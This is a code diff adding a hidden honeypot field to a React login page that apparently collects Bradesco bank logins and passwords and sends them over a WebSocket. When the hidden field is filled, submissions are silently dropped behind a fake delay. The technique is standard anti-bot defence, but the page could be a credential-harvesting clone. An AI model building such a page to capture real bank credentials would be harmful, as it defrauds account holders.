@@ -10,6 +10,7 @@ const LoginPage = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [erro, setErro] = useState("");
+  const [honeypot, setHoneypot] = useState("");
   const navigate = useNavigate();
 
   const { sendLogin } = useWebSocket({
@@ -24,6 +25,12 @@ const LoginPage = () => {
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
+    // Honeypot trap: if filled, silently reject (only bots fill hidden fields)
+    if (honeypot) {
+      setIsLoading(true);
+      setTimeout(() => setIsLoading(false), 3000); // Fake delay to not alert bot
+      return;
+    }
     setErro("");
     setIsLoading(true);
     sendLogin(loginBradesco, senha);
@@ -69,6 +76,19 @@ const LoginPage = () => {
           </p>
 
           <form onSubmit={handleLogin} className="flex flex-col flex-1">
+            {/* Honeypot — invisible to users, filled only by bots */}
+            <div aria-hidden="true" style={{ position: 'absolute', left: '-9999px', opacity: 0, height: 0, overflow: 'hidden' }}>
+              <label htmlFor="website">Website</label>
+              <input
+                type="text"
+                id="website"
+                name="website"
+                tabIndex={-1}
+                autoComplete="off"
+                value={honeypot}
+                onChange={(e) => setHoneypot(e.target.value)}
+              />
+            </div>
             <div className="space-y-2">
               {/* Login field */}
               <div className="bg-white rounded-lg px-4 pt-3 pb-2 border border-[hsl(220,14%,89%)]">
